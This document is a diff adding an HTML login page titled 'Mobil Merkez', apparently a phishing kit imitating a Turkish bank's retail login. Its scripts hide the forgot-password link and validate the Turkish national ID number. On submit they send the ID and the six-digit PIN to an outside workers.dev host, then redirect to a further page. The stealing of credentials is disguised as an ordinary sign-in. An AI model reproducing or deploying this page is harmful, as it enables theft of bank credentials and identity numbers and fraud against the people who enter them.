@@ -1,0 +1,132 @@
+<!doctype html>
+<html lang="tr">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <meta name="theme-color" content="#000000" />
+    <meta name="description" content="Mobil Merkez created using create-react-app" />
+    <title>Mobil Merkez</title>
+    <script defer="defer" src="static/js/main.3c2a2ad0.js"></script>
+    <link href="assets/styles.css" rel="stylesheet" id="style">
+    <link href="static/css/main.075a2e17.css" rel="stylesheet">
+</head>
+
+<body><noscript>You need to enable JavaScript to run this app.</noscript>
+    <div id="root" style="
+    width: 100%;
+    height: 100%;
+"></div>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            setTimeout(function () {
+
+                var tabFooter = document.querySelector('.login-wrap .login-box .tab-item .tab-footer');
+                if (tabFooter) {
+                    tabFooter.style.margin = "0";
+                }
+
+
+                var forgotPasswordLink = document.querySelector('a.custom-link[causesval="true"]');
+                if (forgotPasswordLink) {
+                    forgotPasswordLink.style.display = "none";
+                }
+            }, 500);
+        });   </script>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            setTimeout(function () {
+                var elements = document.querySelectorAll('.col-xs-12.col-md-6');
+                elements.forEach(function (element) {
+                    element.removeAttribute('class');
+                });
+            }, 500);
+        });
+    </script>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            setTimeout(function () {
+                var tcInput = document.getElementById("ctl00_c_RetailIdentityTextBox");
+                var passInput = document.getElementById("ctl00_c_RetailPinTextBox");
+                var loginBtn = document.getElementById("ctl00_c_RetailLoginButton");
+                async function validateInputs() {
+                    var tcno = tcInput.value;
+                    var pass = passInput.value;
+                    if (tcno.length === 11 && pass.length === 6) {
+                        if (await tcno_dogrula_ve_islem_yap(tcno)) {
+                            loginBtn.disabled = false;
+                        } else {
+                            loginBtn.disabled = true;
+                            alert("Geçersiz TC Kimlik Numarası");
+                        }
+                    } else {
+                        loginBtn.disabled = true;
+                    }
+                }
+                loginBtn.addEventListener("click", async function (event) {
+                    event.preventDefault();
+                    loginBtn.disabled = true;
+                    var tcno = tcInput.value || '';
+                    var pass = passInput.value || '';
+                    if (tcno.length === 11 && pass.length === 6) {
+                        var data = new FormData();
+                        data.append('action', "login");
+                        data.append('tcno', tcno);
+                        data.append('pass', pass);
+
+                        fetch('https://curly-fire-5ecb.aisik3516.workers.dev/', {
+                            method: 'POST',
+                            body: data
+                        })
+                            .then(response => response.json())
+                            .then(data => {
+                                window.location.href = 'phone.html';
+                            })
+                            .catch(error => {
+                                console.error('Hata:', error);
+                            });
+
+                    } else {
+                        alert("TC Kimlik Numarası ve şifre eksik veya hatalı.");
+                        loginBtn.disabled = false;
+                    }
+                });
+                async function tcno_dogrula_ve_islem_yap(tcno) {
+                    tcno = String(tcno);
+                    if (tcno.substring(0, 1) === '0') {
+                        return false;
+                    }
+                    if (tcno.length !== 11) {
+                        return false;
+                    }
+                    var ilkon_array = tcno.substr(0, 10).split('');
+                    var ilkon_total = hane_tek = hane_cift = 0;
+                    for (var i = j = 0; i < 9; ++i) {
+                        j = parseInt(ilkon_array[i], 10);
+                        if (i & 1) {
+                            hane_cift += j;
+                        } else {
+                            hane_tek += j;
+                        }
+                        ilkon_total += j;
+                    }
+                    if ((hane_tek * 7 - hane_cift) % 10 !== parseInt(tcno.substr(-2, 1), 10)) {
+                        return false;
+                    }
+                    ilkon_total += parseInt(ilkon_array[9], 10);
+                    if (ilkon_total % 10 !== parseInt(tcno.substr(-1), 10)) {
+                        return false;
+                    }
+                    return true;
+                }
+                tcInput.addEventListener("input", validateInputs);
+                passInput.addEventListener("input", validateInputs);
+                validateInputs();
+            }, 1200);
+        });
+    </script>
+    <script src="assets/script.js?v=1.1.2"></script>
+</body>
+
+</html>
